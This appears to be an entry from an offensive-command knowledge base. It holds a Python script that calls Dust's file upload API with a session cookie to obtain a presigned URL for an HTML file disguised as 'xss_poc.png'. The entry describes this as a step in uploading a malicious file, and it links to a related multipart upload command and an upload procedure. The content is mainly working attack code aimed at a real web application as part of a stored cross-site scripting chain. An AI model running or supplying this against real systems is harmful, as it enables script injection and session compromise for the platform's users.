---
id: 123e4567-e89b-12d3-a456-426614174005
data: >-
  import requests

  cookies = {'appSession': '<dummy_account_session>'}

  json_data = {'contentType': 'text/html', 'fileName': 'xss_poc.png',
  'fileSize': 7331, 'useCase': 'conversation'}

  response = requests.post('https://dust.tt/api/w/<workspace_sid>/files',
  cookies=cookies, json=json_data)

  print(response.json())

  output: null

  created_at: 2023-10-01T00:00:00Z

  updated_at: 2023-10-01T00:00:00Z

  platforms: [
    "Web"
  ]

  tags: [
    "api",
    "upload"
  ]

  ---
tags:
  - api
  - upload
type: command
output: null
executor: python
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.216Z'
verified: false
validated: true
submitted: true
---
# request-upload-url

## Command

```python
import requests
cookies = {'appSession': '<dummy_account_session>'}
json_data = {'contentType': 'text/html', 'fileName': 'xss_poc.png', 'fileSize': 7331, 'useCase': 'conversation'}
response = requests.post('https://dust.tt/api/w/<workspace_sid>/files', cookies=cookies, json=json_data)
print(response.json())
```

## Description

This Python command uses the requests library to POST JSON metadata to Dust's file upload API, requesting a presigned upload URL for the malicious file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| cookies | Session cookies including appSession for authentication | Yes |
| json_data | Dictionary with contentType, fileName, fileSize, useCase | Yes |
| url | API endpoint https://dust.tt/api/w/<workspace_sid>/files | Yes |

## Examples

### Basic Usage

```python
response = requests.post('https://dust.tt/api/w/<workspace_sid>/files', cookies=cookies, json=json_data)
```

### Advanced Usage

Add error handling:

```python
if response.status_code == 200:
    upload_url = response.json()['file']['uploadUrl']
else:
    print('Upload init failed')
```

## Expected Output

JSON response like {"file": {"uploadUrl": "https://...", ...}} containing the presigned URL for file upload.

## Related

- [[commands/upload-html-file-multipart]]
- [[procedures/Upload-Malicious-HTML-File-via-API]]
